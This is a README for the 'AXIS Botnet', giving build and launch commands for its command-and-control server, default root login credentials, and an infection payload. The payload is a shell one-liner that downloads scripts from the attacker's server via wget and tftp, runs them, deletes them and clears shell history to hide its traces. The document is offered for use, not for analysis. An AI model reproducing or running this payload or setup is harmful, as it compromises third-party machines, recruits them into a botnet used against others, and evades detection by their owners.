# AXIS Botnet

### Installation:
* Linux only:
  * **recommended to use Centos 7**
  * `sudo python3 build.py AXIS_CC.c (server-ip)`
  * `gcc AXIS_CNC.c -o AXIS -pthread`
  * `sudo screen ./AXIS 606 1 909`
  
### Connect
* SSH Config:
  * PORT: 909
  * TYPE: RAW
  
* Password (default)
  * username: root
  * password: root
  
### Payload
* Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://(server-ip)/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g (server-ip) -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"

### window
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/808620387390324746/992772504521297990/275038087_1604950353178908_3257252682320961726_n.jpg">
</p>
